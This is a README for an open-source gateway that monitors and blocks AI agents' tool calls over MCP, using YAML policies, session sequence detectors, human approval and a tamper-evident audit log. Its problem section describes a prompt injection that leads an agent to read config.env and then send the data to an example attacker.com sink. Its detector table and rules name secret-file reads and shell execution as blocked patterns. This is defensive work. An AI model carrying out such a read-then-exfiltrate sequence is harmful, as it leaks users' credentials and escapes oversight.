# 🛡️ Agent Safety Gate

<p align="center">
  <b>The Seatbelt for Autonomous AI Agents</b><br>
  <i>An open-standard, Model Context Protocol (MCP) compatible security gateway that intercepts, audits, and controls every tool call before execution.</i>
</p>

<p align="center">
  <a href="https://github.com/hg5594176-source/MCP"><img src="https://img.shields.io/badge/GitHub-Repository-blue?logo=github" alt="Repository"></a>
  <img src="https://img.shields.io/badge/Python-3.10%20%7C%203.11%20%7C%203.12-3776AB?logo=python&logoColor=white" alt="Python Versions">
  <img src="https://img.shields.io/badge/MCP-Compatible-00D26A?logo=fastapi&logoColor=white" alt="MCP Compatible">
  <img src="https://img.shields.io/badge/Tests-120%2F120%20Passing-brightgreen?logo=pytest&logoColor=white" alt="Tests">
  <img src="https://img.shields.io/badge/Recall-100%25%20(15%2F15)-success" alt="Recall">
  <img src="https://img.shields.io/badge/False%20Positive%20Rate-0.0%25-blue" alt="FPR">
  <img src="https://img.shields.io/badge/Latency-1.03ms-orange" alt="Latency">
  <img src="https://img.shields.io/badge/License-MIT-purple" alt="License">
</p>

---

## 🎥 Video Pitch & Walkthrough Demo

https://github.com/user-attachments/assets/bc75254c-1292-42e3-931d-7bf0dddae1de

> 🎬 **Direct File Link:** [**`website/public/demo-video.mp4`**](website/public/demo-video.mp4)  
> *Full 53.4-second walkthrough with neural voiceover (`am_adam`) across all 8 chapters:*

```
0:00 - 0:07 ── Hero: Root access & prompt injection vulnerabilities
0:07 - 0:14 ── Enter the Gate: MCP proxy interception & deterministic YAML rules
0:14 - 0:20 ── Session Timeline: Stateful sequence tracking & exfiltration blocks
0:20 - 0:26 ── Human Approval: Queue with fail-safe auto-deny on timeout
0:26 - 0:31 ── Docker Sandbox & Real-time Output Leak Scanner
0:31 - 0:38 ── Cryptographic Audit: SHA-256 tamper-evident ledger verification
0:38 - 0:44 ── Live Attack Stepper: Harmless steps vs. Devastating sequence
0:44 - 0:53 ── Outro: Production assurance & seatbelt for AI
```

---

## ⚡ The Problem: Why Single-Call Checks Fail

Modern AI agents read files, execute shell commands, call third-party APIs, and process payments. A single prompt injection hidden in a document can command an agent to exfiltrate database credentials or delete folders.

Traditional firewalls inspect tool calls in isolation:
1. `read_file("config.env")` $\to$ **Allowed** *(looks harmless)*
2. `fetch_url("https://untrusted-api.io")` $\to$ **Allowed** *(looks harmless)*
3. `send_request("https://attacker.com/sink", data=...)` $\to$ **Allowed** *(looks harmless)*

**Result:** Exfiltration succeeds because each isolated step is benign.

### The Solution: Stateful Session Detection

**Agent Safety Gate** remembers everything an agent does across a session:
$$\text{Read Secret File} \longrightarrow \text{Outbound HTTP Call} \Longrightarrow \mathbf{BLOCKED!}$$

The gate operates with strict precedence:
$$\mathbf{BLOCK} > \mathbf{REQUIRE\_APPROVAL} > \mathbf{ALLOW}$$

---

## 🏛️ Architecture

```
   ┌────────────────────────────────────────────────────────────────────────┐
   │                           Agent Safety Gate                            │
   │                                                                        │
   │   Agent ──MCP (stdio / SSE)──► [Proxy Server]                          │
   │                                     │                                  │
   │                           ┌─────────▼──────────┐                       │
   │                           │    Gate Engine     │                       │
   │                           │  ┌──────────────┐  │                       │
   │                           │  │  1. Policy   │  │  YAML rules (hard)    │
   │                           │  │  2. Session  │  │  Sequence detectors   │
   │                           │  │  3. Risk     │  │  Static signals + LLM │
   │                           │  │  4. Approval │  │  Human-in-the-loop    │
   │                           │  │  5. Scanner  │  │  Leak redaction       │
   │                           │  └──────────────┘  │                       │
   │                           └─────────┬──────────┘                       │
   │                                     │                                  │
   │              ┌──────────────────────┼──────────────────────┐           │
   │              │                      │                      │           │
   │       [Cryptographic]        [Session Store]        [MCP Client]       │
   │       Audit Log (SQLite      (Sliding window,       Forwarded ONLY     │
   │       SHA-256 chain)         sequence graph)        if ALLOW           │
   │              ▲                                             │           │
   │              │                                             ▼           │
   │              └─────── Web Dashboard & 3D HUD ────── Real Tool Server   │
   └────────────────────────────────────────────────────────────────────────┘
```

---

## 📊 Benchmark Results (25 Multi-Step Attack Scenarios)

Evaluated against 25 automated benchmarks (15 malicious sequences and 10 benign enterprise workflows) recorded in [`benchmark_results.json`](benchmark_results.json):

| Metric | Traditional Per-Call Policy | Agent Safety Gate (Full Pipeline) | Impact |
| :--- | :---: | :---: | :---: |
| **Malicious Block Rate** | 73.3% | **100.0%** | **+26.7% threat prevention** |
| **Recall ($\frac{TP}{TP + FN}$)** | 0.733 | **1.000 (15/15)** | **Zero missed attacks** |
| **Precision ($\frac{TP}{TP + FP}$)** | 1.000 | **1.000** | **Zero false alarms** |
| **False Positive Rate** | 0.0% | **0.0% (0/10)** | **Zero business disruption** |
| **Missed Attacks (False Negatives)**| 4 | **0** | **Total containment** |
| **Average Overhead Latency** | 0.03 ms | **1.03 ms** | **Line-rate execution** |
| **Automated Approvals / Task** | 0.933 | **0.0** | **Zero human fatigue** |

### Attacks Caught Exclusively by Session Sequence Tracking:
* `M08`: Read SSH private key followed by HTTP request $\to$ **Blocked by `SecretReadThenOutbound`**
* `M09`: Rapid email burst ($>5\text{ emails/min}$) $\to$ **Blocked by `RateAnomaly`**
* `M10`: Repeated identical file read loops ($>5\times$) $\to$ **Blocked by `LoopDetection`**
* `M12`: Cumulative micro-payments exceeding spending threshold $\to$ **Blocked by `BudgetLimits`**

---

## 🚀 Quick Start

### 1. Clone & Install

```bash
git clone https://github.com/hg5594176-source/MCP.git
cd MCP

# Install Python dependencies
pip install -r requirements.txt
```

### 2. Run Test Suite (120 Tests)

```bash
pytest tests/ -v
```

### 3. Run Side-by-Side Attack Demo

```bash
# Run side-by-side comparison (without gate vs. with gate)
python -m demo.reckless_agent --compare
```

### 4. Start the Gateway & API Server

```bash
python main.py
# API server running on http://localhost:8000
```

### 5. Launch the 3D Interactive Web Visualizer

```bash
cd website
npm install
npm run dev
# Open http://localhost:5173
```

---

## 🔒 Stateful Session Detectors

The gate maintains sliding-window history per session and executes five sequence detectors on every tool invocation:

| Detector | Trigger Pattern | Action |
| :--- | :--- | :---: |
| **`SecretReadThenOutbound`** | Sensitive file/key read (`.env`, `id_rsa`) followed by network egress (`http`, `send_email`) | `BLOCK` |
| **`UntrustedThenPrivileged`**| Ingested untrusted payload (web download, email) followed by privileged tool (`shell_exec`, `delete`) | `REQUIRE_APPROVAL` |
| **`RateAnomaly`** | Velocity exceeds 20 calls/min or 5 emails/min | `BLOCK` / `REQUIRE_APPROVAL` |
| **`LoopDetection`** | Same call repeated $\ge 5$ times or repeated execution failures | `BLOCK` |
| **`BudgetLimits`** | Cumulative spend $\ge \$500$, $>100$ tool calls, or $>50$ agent iterations | `BLOCK` |

---

## 📝 Writing Policy Rules

Policies live in [`policies/default.yaml`](policies/default.yaml). Hard rules evaluate before any heuristic or advisory LLM:

```yaml
version: "1"
default_deny: true # Unknown tools blocked by default

rules:
  # Unconditional shell block
  - id: block_shell_exec
    tool: shell_exec
    action: block
    reason: "Shell execution is strictly forbidden"

  # Secret file path pattern match
  - id: block_env_read
    tool: file_read
    match:
      path_glob: "**/.env*"
    action: block
    reason: "Access to environment and secret files is blocked"

  # Spending threshold check
  - id: block_large_payment
    tool: send_payment
    match:
      amount_gt: 100
    action: block
    reason: "Payments over $100 are blocked"

  # Domain allowlist
  - id: allow_internal_email
    tool: send_email
    match:
      recipient_domain_not_in:
        - example.com
        - internal.corp
    action: block
    reason: "External email domains are blocked"
```

---

## 🛡️ Tamper-Evident SHA-256 Audit Chain

Every decision is permanently written to an SQLite hash chain ([`gate_audit.db`](gate_audit.db)):

$$\text{row\_hash}_i = \text{SHA-256}(\text{row\_hash}_{i-1} \parallel \text{call\_id} \parallel \text{tool} \parallel \text{arguments} \parallel \text{decision} \parallel \text{timestamp})$$

### Verify Ledger Integrity

```bash
python -c "from gate.audit.log import AuditLog; ok, err = AuditLog('gate_audit.db').verify(); print('✅ Hash chain verified!' if ok else f'❌ Tampering detected: {err}')"
```

---

## 📁 Repository Map

```
MCP/
├── gate/                     # Core Security Gateway Engine
│   ├── api/routes.py         # FastAPI REST & SSE endpoints
│   ├── approval/queue.py     # Human-in-the-loop queue with auto-deny timeouts
│   ├── audit/log.py          # Cryptographic SHA-256 hash-chain audit logger
│   ├── policy/engine.py      # Deterministic YAML policy evaluator
│   ├── proxy/proxy.py        # MCP stdio / SSE bidirectional proxy
│   ├── risk/scorer.py        # Static risk signals & LLM advisory judge
│   ├── sandbox/executor.py   # Docker ephemeral isolation runtime
│   ├── scanner/output_scanner.py # Real-time API key & injection redaction
│   └── session/detectors.py  # Stateful sequence threat detectors
├── policies/default.yaml     # Production security rule definitions
├── demo/                     # Demo scripts and 25 benchmark suites
├── tests/                    # 120 automated pytest test cases
├── website/                  # 3D Interactive Next/Vite Web UI Visualizer
│   └── public/demo-video.mp4 # Full 53-second voiced walkthrough demo video
├── Dockerfile                # Gateway container definition
├── docker-compose.yml        # All-in-one local stack setup
└── benchmark_results.json    # Quantitative benchmark evaluation results
```

---

## 📄 License

Distributed under the **MIT License**. See `LICENSE` for details.
